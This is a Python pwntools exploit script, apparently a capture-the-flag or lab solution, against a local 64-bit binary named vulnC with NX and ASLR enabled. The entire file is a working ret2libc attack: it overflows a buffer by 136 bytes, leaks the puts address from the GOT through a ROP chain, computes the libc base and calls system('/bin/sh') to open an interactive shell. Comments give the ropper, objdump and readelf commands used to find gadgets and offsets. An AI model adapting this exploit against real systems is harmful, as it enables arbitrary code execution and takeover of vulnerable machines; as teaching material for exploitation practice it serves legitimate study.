import pwn
import struct

# vulnC is a 64-bit executable
# NX is enabled ASLR is turned on

target = pwn.process('./vulnC')

###################################
#### Gadgets That We Will Need ####
###################################

# pop rdi gadget:
# ropper --file vulnC --search "pop rdi; ret;"
pop_rdi = struct.pack("<Q", 0x401283)

# ret instruction padding
ret_padding = struct.pack("<Q", 0x401283 + 1)

# Address of our main function so we can loop back over
# objdump -D vulnC | grep main
main_addr = struct.pack("<Q", 0x401156)

#############################################
#### Leaking the Address of Puts in libc ####
#############################################

# We accomplish this by calling puts with the got address of puts as its parameter

# puts address in plt
# objdump -D vulnC | grep puts
puts_plt = struct.pack("<Q", 0x401050)

# puts address in got
# objdump -R vulnC | grep puts
puts_got = struct.pack("<Q", 0x403370)

payload = b'a' * 136 # distance to overflow
payload += pop_rdi # pop rdi gadget to pop the puts_got address into rdi
payload += puts_got
payload += puts_plt	# Execute a call to puts, which will print the value pointed at by the pointer in rdi
payload += main_addr # Loop back to the start of main, so we can continue exploiting

target.sendline(payload)

target.recvuntil(b'Thank You\n')

leak = target.recvline().strip(b'\n')
puts_libc_addr = leak + b'\0' * (8 - len(leak))
puts_libc_addr = struct.unpack("<Q", puts_libc_addr)[0]

print(f"Leaked puts@GLIBC: {hex(puts_libc_addr)}")

#########################################################
#### Computing libc base, offsets, and final payload ####
#########################################################

# puts in libc:
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
puts_libc_offset = 0x84420

# system in libc:
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_libc_offset = 0x52290

# /bin/sh string in libc:
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh_libc_offset = 0x1b45bd

libc_base_addr = puts_libc_addr - puts_libc_offset

payload = b'a' * 136 	# distance to overflow
payload += pop_rdi	# pop rdi gadget to pop pointer to /bin/sh into rdi
payload += struct.pack("<Q", libc_base_addr + bin_sh_libc_offset)
payload += ret_padding	# need this for 16 byte stack alignment
payload += struct.pack("<Q", libc_base_addr + system_libc_offset)

target.sendline(payload)

target.interactive()









